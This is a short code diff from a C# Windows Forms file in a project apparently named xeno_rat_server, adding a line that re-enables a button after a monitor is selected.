@@ -461,6 +461,7 @@ namespace xeno_rat_server.Forms
             {
                 await SetMonitor(selectedIndex);
             }
+            button2.Enabled = true;
         }
 
         /// <summary>
